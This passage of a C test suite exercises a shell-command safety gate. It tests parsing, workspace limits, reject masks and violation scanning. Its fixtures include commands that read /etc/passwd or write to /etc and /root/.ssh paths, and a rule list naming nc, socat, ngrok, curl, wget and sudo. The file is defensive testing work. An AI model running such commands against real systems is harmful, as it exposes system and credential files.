      {"sh -c \"$(exec 2>&1; false 1>&- 2>&- && x=$(<\"$FILE\"))\"", "0:,",
       false},
      {"sh -c \"$(: 2>&1 >$(<\"$FILE\") 1>&- 2>&-)\"", "0:,", true},
      {"sh -c \"$(x=$(exec 2>&1; y=$(<\"$FILE\")))\"", "0:,", false},
  };
  sg_gate_t *gate = sg_gate_new();
  ASSERT_NOT_NULL(gate);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    file_diagnostic_fixture_t fixture = {cases[i].value, 0};
    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_file_diagnostic,
                                                 &fixture));
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    ASSERT(!result.truncated && result.subcommand_count != 0);
    ASSERT(fixture.calls == (i == 9 ? 0 : 1));
    const sg_subcommand_result_t *outer = &result.subcommands[0];
    ASSERT(outer->netargv_length >= 5 &&
           memcmp(outer->netargv, "2:sh,", 5) == 0);
    if (outer->requires_substitution_evaluation != cases[i].outer_inspection)
      printf("\n    file diagnostic consumer: %s\n", cases[i].source);
    ASSERT(outer->requires_substitution_evaluation ==
           cases[i].outer_inspection);
    ASSERT(outer->has_dynamic_substitution_io == cases[i].outer_inspection);
    if (cases[i].outer_inspection)
      ASSERT(result.requires_substitution_evaluation &&
             result.has_dynamic_substitution_io);
  }
  sg_gate_free(gate);
}

TEST(file_substitution_path_failure_is_local) {
  expansion_rule_t rules[] = {
      {"\"$(<\"$FILE\")\"", SHELL_EXPAND_WORD_ARGUMENT, SHELL_EXPAND_UNRESOLVED,
       NULL, 0},
      {"\"$TAIL\"", SHELL_EXPAND_WORD_ARGUMENT, SHELL_EXPAND_RESOLVED, "3:hit,",
       0},
      {"\"$FILE\"", SHELL_EXPAND_WORD_FILE_SUBSTITUTION_PATH,
       SHELL_EXPAND_RESOLVED, "", 0},
  };
  expansion_contract_t contract = {
      .rules = rules,
      .rule_count = sizeof(rules) / sizeof(rules[0]),
      .valid = true,
  };
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_SG_OK(
      sg_gate_set_expand_word_netargv(gate, expand_by_source_word, &contract));
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "echo \"$(<\"$FILE\")\" \"$TAIL\"", &result));
  ASSERT(contract.valid && contract.calls == 3);
  for (size_t i = 0; i < sizeof(rules) / sizeof(rules[0]); i++)
    ASSERT(rules[i].calls == 1);
  ASSERT(result.subcommand_count == 1);
  ASSERT((result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_ARGV) !=
         0);
  ASSERT(!result.requires_substitution_evaluation);
  sg_gate_free(gate);
}

static shell_expand_status_t
expand_empty_path(const shell_expand_word_request_t *request,
                  const char **netargv, size_t *length, void *context) {
  unsigned *calls = context;
  if (request->purpose == SHELL_EXPAND_WORD_ARGUMENT ||
      request->word_length != sizeof("\"$FAIL\"") - 1 ||
      memcmp(request->source + request->word_offset, "\"$FAIL\"",
             request->word_length) != 0)
    return SHELL_EXPAND_UNRESOLVED;
  (*calls)++;
  *netargv = "0:,";
  *length = 3;
  return SHELL_EXPAND_RESOLVED;
}

TEST(empty_path_static_resolved_equivalence) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  unsigned calls = 0;
  ASSERT_SG_OK(
      sg_gate_set_expand_word_netargv(gate, expand_empty_path, &calls));
  size_t spellings = sizeof(shellsplit_test_empty_path_spellings) /
                     sizeof(shellsplit_test_empty_path_spellings[0]);
  for (size_t i = 0; i < sizeof(shellsplit_test_empty_paths) /
                             sizeof(shellsplit_test_empty_paths[0]);
       i++) {
    uint32_t baseline_flags = 0, baseline_count = 0;
    for (size_t spelling = 0; spelling <= spellings; spelling++) {
      char source[256];
      int length = snprintf(
          source, sizeof(source), shellsplit_test_empty_paths[i].source,
          spelling == spellings
              ? "\"$FAIL\""
              : shellsplit_test_empty_path_spellings[spelling]);
      ASSERT(length > 0 && (size_t)length < sizeof(source));
      calls = 0;
      sg_result_t result = {0};
      ASSERT_SG_OK(eval_cmd(gate, source, &result));
      unsigned writes = 0, reads = 0;
      for (uint32_t command = 0; command < result.subcommand_count; command++) {
        writes += result.subcommands[command].write_count;
        reads += result.subcommands[command].read_count;
      }
      unsigned expected = shellsplit_test_empty_paths[i].opens +
                          shellsplit_test_empty_paths[i].writes;
      if (writes != expected || reads != shellsplit_test_empty_paths[i].reads)
        printf("\n    empty path %s: writes=%u reads=%u\n", source, writes,
               reads);
      ASSERT(writes == expected &&
             reads == shellsplit_test_empty_paths[i].reads);
      ASSERT(((result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0) ==
             (expected != 0));
      ASSERT(result.requires_substitution_evaluation ==
             shellsplit_test_empty_paths[i].shell_word);
      ASSERT(!result.truncated &&
             calls == (spelling == spellings &&
                       shellsplit_test_empty_paths[i].reached));
      if (spelling == 0) {
        baseline_flags = result.unresolved_expansion_flags;
        baseline_count = result.subcommand_count;
      }
      ASSERT(result.unresolved_expansion_flags == baseline_flags &&
             result.subcommand_count == baseline_count);
    }
  }
  sg_gate_free(gate);
}

TEST(static_empty_path_callback_reachability) {
  static const struct {
    const char *source;
    size_t argument_calls, tail_calls;
  } cases[] = {
      {"echo \"$ARG\" >\"\" >\"$LATER\"", 1, 0},
      {"{ echo \"$ARG\"; } >\"\" >\"$LATER\"", 0, 0},
      {"false && { echo \"$ARG\"; } >\"\"; echo \"$TAIL\"", 0, 1},
      {"echo >\"\" || echo \"$TAIL\"", 0, 1},
      {"echo >\"\" && echo \"$TAIL\"", 0, 0},
      {"! { echo \"$ARG\"; } >\"\" || echo \"$TAIL\"", 0, 1},
      {"echo \"$(<\"\")\" \"$TAIL\"", 0, 1},
      {"{ echo \"$ARG\"; } >\"$BEFORE\" >\"\" >\"$LATER\"", 0, 0},
  };
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    expansion_rule_t rules[] = {
        {"\"$ARG\"", SHELL_EXPAND_WORD_ARGUMENT, SHELL_EXPAND_RESOLVED,
         "3:hit,", 0},
        {"\"$TAIL\"", SHELL_EXPAND_WORD_ARGUMENT, SHELL_EXPAND_RESOLVED,
         "4:tail,", 0},
        {"\"$LATER\"", SHELL_EXPAND_WORD_REDIRECT_PATH, SHELL_EXPAND_FAILED,
         NULL, 0},
        {"\"$(<\"\")\"", SHELL_EXPAND_WORD_ARGUMENT, SHELL_EXPAND_UNRESOLVED,
         NULL, 0},
        {"\"$BEFORE\"", SHELL_EXPAND_WORD_REDIRECT_PATH, SHELL_EXPAND_RESOLVED,
         "11:/tmp/before,", 0},
    };
    expansion_contract_t contract = {.rules = rules,
                                     .rule_count =
                                         sizeof(rules) / sizeof(rules[0]),
                                     .valid = true};
    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
                                                 &contract));
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    ASSERT(contract.valid && rules[0].calls == cases[i].argument_calls &&
           rules[1].calls == cases[i].tail_calls && rules[2].calls == 0);
    ASSERT(rules[3].calls == (i == 6) && rules[4].calls == (i == 7));
    ASSERT(!result.requires_substitution_evaluation && !result.truncated);
  }
  sg_gate_free(gate);
}

TEST(resolved_named_redirect_failure_effects) {
  static const struct {
    const char *source;
    unsigned writes;
    bool sensitive;
  } cases[] = {
      {"exec {fd}>\"$FAIL\"", 0, false},
      {"true {fd}<>\"$FAIL\"", 0, false},
      {"echo >\"$FAIL\" {fd}>/etc/later", 0, false},
      {"{ echo hi; } >\"$FAIL\" {fd}>/etc/later", 0, false},
      {"true {fd}>/etc/kept >\"$FAIL\"; echo >&\"$fd\"", 2, true},
      {"exec {fd}>/etc/kept >\"$FAIL\"; echo >&\"$fd\"", 2, true},
      {"true {fd}>\"$FAIL\" && echo >/etc/later", 0, false},
      {"true {fd}>\"$FAIL\" || echo >/etc/later", 1, true},
  };
  static const char *failures[] = {"", "0:,", "1:a,1:b,"};
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  for (size_t failure = 0; failure < sizeof(failures) / sizeof(failures[0]);
       failure++) {
    for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
      expansion_rule_t rule = {"\"$FAIL\"", SHELL_EXPAND_WORD_REDIRECT_PATH,
                               SHELL_EXPAND_RESOLVED, failures[failure], 0};
      expansion_contract_t contract = {
          .rules = &rule, .rule_count = 1, .valid = true};
      ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
                                                   &contract));
      sg_result_t result = {0};
      ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
      unsigned writes = 0;
      for (uint32_t command = 0; command < result.subcommand_count; command++)
        writes += result.subcommands[command].write_count;
      ASSERT(contract.valid && rule.calls == 1 && writes == cases[i].writes);
      ASSERT(((result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0) ==
             cases[i].sensitive);
    }
  }
  sg_gate_free(gate);
}

TEST(resolved_path_workspace_capacity_and_retry) {
  static const char source[] = "echo; echo; echo >\"$OUT\"";
  size_t source_length = sizeof(source) - 1;
  size_t hint = sg_gate_evaluate_size_hint(source_length);
  /* Each path span exceeds the complete ordinary workspace, forcing scratch
   * and the identity pool into additional caller storage without relying on
   * private index sizes or the current workspace's incidental spare bytes. */
  size_t path_length = (hint + 3) & ~(size_t)1;
  char *records = malloc(path_length + 32);
  ASSERT(records != NULL);
  int header = snprintf(records, 32, "%zu:", path_length);
  ASSERT(header > 0 && header < 32);
  char *path = records + header;
  path[path_length] = ',';
  path[path_length + 1] = 0;
  expansion_rule_t rule = {"\"$OUT\"", SHELL_EXPAND_WORD_REDIRECT_PATH,
                           SHELL_EXPAND_RESOLVED, records, 0};
  expansion_contract_t contract = {
      .rules = &rule, .rule_count = 1, .valid = true};
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/root/.ssh"));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "echo", false));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 5.0, NULL));
  ASSERT_SG_OK(
      sg_gate_set_expand_word_netargv(gate, expand_by_source_word, &contract));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = "/root/.ssh/id";
  config.sensitive_write_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  sg_gate_t *reference = sg_gate_new();
  ASSERT(reference != NULL);
  ASSERT_SG_OK(sg_gate_set_cwd(reference, "/root/.ssh"));
  ASSERT_SG_OK(sg_gate_set_suggestions(reference, false));
  ASSERT_ST_OK(test_policy_replace_cpl(reference, false, "echo", false));
  ASSERT_SG_OK(sg_gate_enable_anomaly(reference, 5.0, NULL));
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(reference, &config));
  st_netargv_view_t view = {records, (size_t)header + path_length + 1};
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(reference,
                                               expand_requested_length, &view));

  size_t extension =
      2 * path_length + 1 + 2 * (source_length + SHELL_DEP_CWD_BUF_SIZE + 1u);
  /* Resolved targets now also appear in owned violation diagnostics. */
  size_t buffer_size = hint + extension + 2 * path_length + 256;
  char *buffer = malloc(buffer_size);
  ASSERT(buffer != NULL);
  for (unsigned absolute = 0; absolute < 2; absolute++) {
    size_t start = 0;
    if (absolute) {
      memcpy(path, "/root/.ssh//", 12);
      start = 12;
    }
    for (size_t i = start; i < path_length - 2; i += 2)
      memcpy(path + i, "./", 2);
    memcpy(path + path_length - 2, "id", 2);
    size_t vocabulary = test_anomaly_vocabulary(gate);
    sg_result_t result = {0};
    size_t calls = contract.calls;
    ASSERT(sg_gate_evaluate(gate, source, source_length, buffer, hint,
                            &result) == SG_ERR_MEMORY);
    ASSERT(result.verdict == SG_VERDICT_UNDETERMINED && !result.truncated &&
           result.unresolved_expansion_flags == 0 &&
           test_anomaly_vocabulary(gate) == vocabulary);
    ASSERT(contract.valid && contract.calls == calls + 1);

    /* One byte short of the reservation (plus a nonempty result prefix) is a
     * workspace failure; the exact reservation leaves only a truncated
     * diagnostic, and the ordinary allowance then completes evaluation. */
    size_t alignment = shell_dep_workspace_alignment();
    size_t fixed_workspace = sg_test_eval_workspace_size(source_length);
    size_t minimal = fixed_workspace + extension + alignment;
    ASSERT(sg_gate_evaluate(gate, source, source_length, buffer,
                            minimal - alignment, &result) == SG_ERR_MEMORY);
    ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
           test_anomaly_vocabulary(gate) == vocabulary);
    ASSERT(sg_gate_evaluate(gate, source, source_length, buffer, minimal,
                            &result) == SG_ERR_TRUNC);
    ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED &&
           test_anomaly_vocabulary(gate) == vocabulary);

    ASSERT_SG_OK(sg_gate_evaluate(gate, source, source_length, buffer,
                                  buffer_size, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && !result.truncated &&
           result.subcommand_count == 3 &&
           result.subcommands[2].write_count == 1 &&
           result.unresolved_expansion_flags == 0 &&
           (result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE));
    size_t prefix =
        sg_test_eval_prefix_size(buffer, buffer_size, source_length) -
        extension;
    for (uint32_t i = 0; i < result.subcommand_count; i++) {
      ASSERT((size_t)(result.subcommands[i].netargv - buffer) +
                 result.subcommands[i].netargv_length <
             prefix);
      ASSERT((size_t)(result.subcommands[i].display_command - buffer) +
                 strlen(result.subcommands[i].display_command) <
             prefix);
    }
    ASSERT(result.violation_count != 0);
    for (uint32_t i = 0; i < result.violation_count; i++) {
      ASSERT((size_t)(result.violations[i].description - buffer) +
                 strlen(result.violations[i].description) <
             prefix);
      ASSERT((size_t)(result.violations[i].detail - buffer) +
                 strlen(result.violations[i].detail) <
             prefix);
    }
    memset(buffer + prefix, 0x5a, buffer_size - prefix);
    for (uint32_t i = 0; i < result.subcommand_count; i++) {
      ASSERT_STR(result.subcommands[i].netargv, "4:echo,");
      ASSERT_STR(result.subcommands[i].display_command, "echo");
    }
    ASSERT(contract.valid && contract.calls == calls + 4);
    sg_result_t reference_result = {0};
    ASSERT_SG_OK(sg_gate_evaluate(reference, source, source_length, buffer,
                                  buffer_size, &reference_result));
    ASSERT(result.anomaly_update == reference_result.anomaly_update &&
           result.anomaly_detected == reference_result.anomaly_detected &&
           result.anomaly_score == reference_result.anomaly_score &&
           result.anomaly_score_raw == reference_result.anomaly_score_raw &&
           result.anomaly_score_type == reference_result.anomaly_score_type &&
           test_anomaly_vocabulary(gate) == test_anomaly_vocabulary(reference));
  }
  /* A path-workspace failure precedes rendering every command. Preserve argv
   * uncertainty in another retained owner despite this operational failure. */
  expansion_rule_t uncertainty_rules[] = {
      {"\"$OUT\"", SHELL_EXPAND_WORD_REDIRECT_PATH, SHELL_EXPAND_RESOLVED,
       records, 0},
      {"\"$DATA\"", SHELL_EXPAND_WORD_ARGUMENT, SHELL_EXPAND_UNRESOLVED, NULL,
       0},
  };
  expansion_contract_t uncertainty = {
      .rules = uncertainty_rules, .rule_count = 2, .valid = true};
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
                                               &uncertainty));
  static const char uncertain_source[] = "echo \"$DATA\"; echo >\"$OUT\"";
  size_t uncertain_hint =
      sg_gate_evaluate_size_hint(sizeof(uncertain_source) - 1);
  ASSERT(uncertain_hint <= buffer_size);
  sg_result_t uncertain_result = {0};
  ASSERT(sg_gate_evaluate(gate, uncertain_source, sizeof(uncertain_source) - 1,
                          buffer, uncertain_hint,
                          &uncertain_result) == SG_ERR_MEMORY);
  ASSERT(uncertainty.valid && uncertainty.calls == 2 &&
         uncertain_result.verdict == SG_VERDICT_UNDETERMINED &&
         !uncertain_result.truncated &&
         uncertain_result.subcommand_count == 0 &&
         uncertain_result.unresolved_expansion_flags ==
             SG_EXPANSION_UNRESOLVED_ARGV);
  sg_gate_free(reference);
  sg_gate_free(gate);
  free(buffer);
  free(records);
}

TEST(resolved_path_identity_pool_capacity) {
  static const char source[] = "echo >\"$A\" >\"$B\" >\"$C\"";
  size_t source_length = sizeof(source) - 1;
  size_t hint = sg_gate_evaluate_size_hint(source_length);
  size_t path_length = hint / 3 + 1024;
  size_t stride = path_length + 32;
  char *records = malloc(3 * stride);
  ASSERT(records != NULL);
  expansion_rule_t rules[] = {
      {"\"$A\"", SHELL_EXPAND_WORD_REDIRECT_PATH, SHELL_EXPAND_RESOLVED,
       records, 0},
      {"\"$B\"", SHELL_EXPAND_WORD_REDIRECT_PATH, SHELL_EXPAND_RESOLVED,
       records + stride, 0},
      {"\"$C\"", SHELL_EXPAND_WORD_REDIRECT_PATH, SHELL_EXPAND_RESOLVED,
       records + 2 * stride, 0},
  };
  for (size_t i = 0; i < 3; i++) {
    char *record = records + i * stride;
    int header = snprintf(record, 32, "%zu:", path_length);
    ASSERT(header > 0 && header < 32);
    char *path = record + header;
    path[0] = '/';
    memset(path + 1, 'a' + (int)i, path_length - 1);
    path[path_length] = ',';
    path[path_length + 1] = 0;
  }
  expansion_contract_t contract = {
      .rules = rules, .rule_count = 3, .valid = true};
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "echo", false));
  ASSERT_SG_OK(
      sg_gate_set_expand_word_netargv(gate, expand_by_source_word, &contract));
  size_t size = hint + 7 * path_length +
                2 * (source_length + SHELL_DEP_CWD_BUF_SIZE + 1u) + 512;
  char *buffer = malloc(size);
  ASSERT(buffer != NULL);
  sg_result_t result = {0};
  /* Without violation analysis, borrowed redirect values do not consume
   * identity storage and cannot force an otherwise unnecessary reservation. */
  ASSERT_SG_OK(
      sg_gate_evaluate(gate, source, source_length, buffer, hint, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && contract.calls == 3);
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = "/";
  config.sensitive_write_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  ASSERT(sg_gate_evaluate(gate, source, source_length, buffer, hint, &result) ==
         SG_ERR_MEMORY);
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED && !result.truncated &&
         contract.calls == 6);
  ASSERT_SG_OK(
      sg_gate_evaluate(gate, source, source_length, buffer, size, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && !result.truncated &&
         result.subcommand_count == 1 &&
         result.subcommands[0].write_count == 3 &&
         (result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) &&
         result.unresolved_expansion_flags == 0 && contract.valid &&
         contract.calls == 9);
  for (size_t i = 0; i < 3; i++)
    ASSERT(rules[i].calls == 3);
  sg_gate_free(gate);
  free(buffer);
  free(records);
}

static shell_expand_status_t
expand_failed(const shell_expand_word_request_t *request, const char **netargv,
              size_t *length, void *ctx) {
  (void)request;
  (void)netargv;
  (void)length;
  (void)ctx;
  return SHELL_EXPAND_FAILED;
}

static sg_gate_t *gate_with_violations(void);

TEST(expansion_bounds_matrix) {
  sg_result_t result;
  char expansion[4097];
  ASSERT(snprintf(expansion, sizeof(expansion), "4091:") == 5);
  memset(expansion + 5, 'x', 4091);
  expansion[4096] = ',';
  struct expansion_view view = {expansion, sizeof(expansion)};
  sg_gate_t *expanded = sg_gate_new();
  ASSERT(expanded != NULL);
  ASSERT_ST_OK(test_policy_replace_cpl(expanded, false, "echo *", false));
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(expanded,
                                               expand_requested_length, &view));
  ASSERT_SG_OK(eval_cmd(expanded, "echo $VALUE", &result));
  ASSERT(!result.truncated);
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(eval_with_prefix(expanded, "echo $VALUE", 4096, &result) ==
         SG_ERR_TRUNC);
  ASSERT(result.truncated);
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  sg_gate_free(expanded);

  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "echo *", false));
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, NULL, NULL));
  char long_glob[320];
  memcpy(long_glob, "echo ", 5);
  memset(long_glob + 5, '*', 300);
  long_glob[305] = '\0';
  ASSERT_SG_OK(eval_cmd(gate, long_glob, &result));
  ASSERT(!result.truncated);
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  sg_gate_free(gate);
}

TEST(truncation_cross_product_matrix) {
  sg_gate_t *gate = gate_with_violations();
  ASSERT(gate != NULL);
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "id", false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "pwd", false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "cat", false));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  struct {
    const char *command;
    size_t buffer_size;
    sg_error_t expected_error;
    sg_verdict_t expected_verdict;
    uint32_t expected_count;
    bool expects_dynamic_content;
  } cases[] = {
      {"echo $(id)$(pwd)", 4096, SG_OK, SG_VERDICT_ALLOW_CONDITIONAL, 3, true},
      {"echo $(id)$(pwd)", 16, SG_ERR_TRUNC, SG_VERDICT_UNDETERMINED, 1, true},
      {"cat /etc/passwd ; echo $(id)", 4096, SG_OK,
       SG_VERDICT_ALLOW_CONDITIONAL, 3, true},
      {"cat /etc/passwd ; echo $(id)", 12, SG_ERR_TRUNC,
       SG_VERDICT_UNDETERMINED, 1, true},
      {"echo $(</tmp/direct)", 16, SG_ERR_TRUNC, SG_VERDICT_UNDETERMINED, 1,
       true},
      {"cat <<EOF\n$(id)\nEOF", 16, SG_ERR_TRUNC, SG_VERDICT_UNDETERMINED, 2,
       true},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result;
    sg_error_t error =
        eval_with_prefix(gate, cases[i].command, cases[i].buffer_size, &result);
    ASSERT(error == cases[i].expected_error);
    ASSERT(result.verdict == cases[i].expected_verdict);
    ASSERT(result.subcommand_count == cases[i].expected_count);
    ASSERT(result.truncated == (error == SG_ERR_TRUNC));
    ASSERT(result.requires_substitution_evaluation ==
           cases[i].expects_dynamic_content);
    if (error == SG_ERR_TRUNC)
      ASSERT(result.verdict != SG_VERDICT_ALLOW &&
             result.verdict != SG_VERDICT_ALLOW_CONDITIONAL);
  }

  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_failed, NULL));
  sg_result_t result;
  ASSERT(eval_with_prefix(gate, "echo $VALUE", 4096, &result) == SG_ERR_EXPAND);
  ASSERT(!result.truncated && result.verdict == SG_VERDICT_UNDETERMINED);

  char many_writes[2048] = {0};
  size_t used = 0;
  for (size_t i = 0; i < SG_MAX_VIOLATIONS + 4; i++) {
    int written =
        snprintf(many_writes + used, sizeof(many_writes) - used,
                 "%secho x > /etc/truncation-%zu", i == 0 ? "" : " ; ", i);
    ASSERT(written > 0 && (size_t)written < sizeof(many_writes) - used);
    used += (size_t)written;
  }
  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, NULL, NULL));
  ASSERT(eval_with_prefix(gate, many_writes, 4096, &result) == SG_OK);
  ASSERT(!result.truncated);
  ASSERT(result.violation_truncated);
  ASSERT(result.violation_count <= SG_MAX_VIOLATIONS);
  ASSERT(result.violation_dropped_count > 0);
  ASSERT(result.violation_type_flags == result.violation_type_flags);
  ASSERT(eval_with_prefix(gate, many_writes, 32, &result) == SG_ERR_TRUNC);
  ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED);
  sg_gate_free(gate);
}

TEST(reject_mask_feature_matrix) {
  static const struct {
    const char *command;
    uint32_t feature;
  } cases[] = {
      {"echo $VALUE", SHELL_FEAT_VARS},
      {"echo *.txt", SHELL_FEAT_GLOBS},
      {"while true", SHELL_FEAT_LOOPS},
      {"if true", SHELL_FEAT_CONDITIONALS},
      {"case value", SHELL_FEAT_CASE},
      {"echo $(<file)", SHELL_FEAT_SUBSHELL_FILE},
      {"echo $\\\n((1 + 2))", SHELL_FEAT_ARITH},
      {"echo $\\\n(printf child)", SHELL_FEAT_SUBSHELL},
      {"cat <\\\n(printf input)", SHELL_FEAT_PROCESS_SUB},
      {"echo $\\\n'quoted'", SHELL_FEAT_ANSI_C_QUOTE},
      {"printf %s @\\\n(one|two)", SHELL_FEAT_EXTGLOB},
      {"printf %s {f\\\nd}>out", SHELL_FEAT_NAMED_FD},
      {"printf x &\\\n>out", SHELL_FEAT_COMBINED_REDIRECT},
      {"echo data | cat", SHELL_FEAT_PIPELINE},
      {"cat <<EOF\nhello\nEOF", SHELL_FEAT_HEREDOC},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *gate = sg_gate_new();
    ASSERT(gate != NULL);
    ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "echo *", false));
    ASSERT_SG_OK(sg_gate_set_reject_mask(gate, cases[i].feature));
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
    ASSERT(result.verdict == SG_VERDICT_REJECT);
    ASSERT(result.subcommand_count == 1);

    sg_gate_free(gate);
  }
}

TEST(default_reject_mask_catches_continued_arithmetic) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "echo *", false));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "echo $\\\n((1 + 2))", &result));
  ASSERT(result.verdict == SG_VERDICT_REJECT);
  ASSERT(result.subcommand_count == 1);
  sg_gate_free(gate);
}

/* --- VIOLATION SCANNING --- */

static sg_gate_t *gate_with_violations(void) {
  static const char *rules[] = {
      "echo *",    "cat #path", "ls",     "rm *",     "sudo *",
      "curl *",    "chmod *",   "sh",     "bash",     "base64",
      "openssl *", "git *",     "scp *",  "rsync *",  "nc *",
      "crontab",   "head",      "wget *", "python *", "socat *",
      "ngrok *",   "su *",      "passwd", "chgrp *",  "node",
  };
  sg_gate_t *g = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  if (!g)
    return NULL;
  sg_violation_config_t cfg;
  sg_violation_config_default(&cfg);
  if (sg_gate_set_violation_config_borrowed(g, &cfg) != SG_OK) {
    sg_gate_free(g);
    return NULL;
  }
  return g;
}

typedef struct {
  const char *name;
  const char *dangerous;
  const char *benign;
  uint32_t flag;
  uint32_t min_severity;
  const char *detail_contains;
} violation_case_t;

static bool violation_result_is_consistent(const sg_result_t *result) {
  if ((result->violation_count > 0) != result->has_violations ||
      (result->violation_type_flags != 0) != result->has_violations ||
      result->violation_count > SG_MAX_VIOLATIONS) {
    printf("    inconsistent violation summary: count=%u flags=0x%x has=%d\n",
           result->violation_count, result->violation_type_flags,
           result->has_violations);
    return false;
  }

  uint32_t recorded_flags = 0;
  for (uint32_t i = 0; i < result->violation_count; i++) {
    const sg_violation_t *violation = &result->violations[i];
    if (violation->type == 0 || !violation->description ||
        violation->description[0] == '\0') {
      printf("    incomplete violation record %u: type=0x%x description=%p\n",
             i, violation->type, (void *)violation->description);
      return false;
    }
    recorded_flags |= violation->type;
  }
  bool flags_valid = (recorded_flags & ~result->violation_type_flags) == 0;
  if (result->violation_dropped_count == 0)
    flags_valid = flags_valid && recorded_flags == result->violation_type_flags;
  else
    flags_valid = flags_valid && result->violation_count == SG_MAX_VIOLATIONS;
  if (!flags_valid)
    printf("    violation flags differ: records=0x%x summary=0x%x dropped=%u\n",
           recorded_flags, result->violation_type_flags,
           result->violation_dropped_count);
  return flags_valid;
}

static bool run_violation_case(sg_gate_t *gate,
                               const violation_case_t *test_case) {
  sg_result_t result;
  if (eval_cmd(gate, test_case->dangerous, &result) != SG_OK ||
      !violation_result_is_consistent(&result) || !result.has_violations ||
      !(result.violation_type_flags & test_case->flag)) {
    printf("    case %s did not set expected flag\n", test_case->name);
    return false;
  }

  const sg_violation_t *violation = NULL;
  for (uint32_t i = 0; i < result.violation_count; i++) {
    if (result.violations[i].type == test_case->flag) {
      violation = &result.violations[i];
      break;
    }
  }
  if (!violation || violation->severity < test_case->min_severity ||
      !violation->description ||
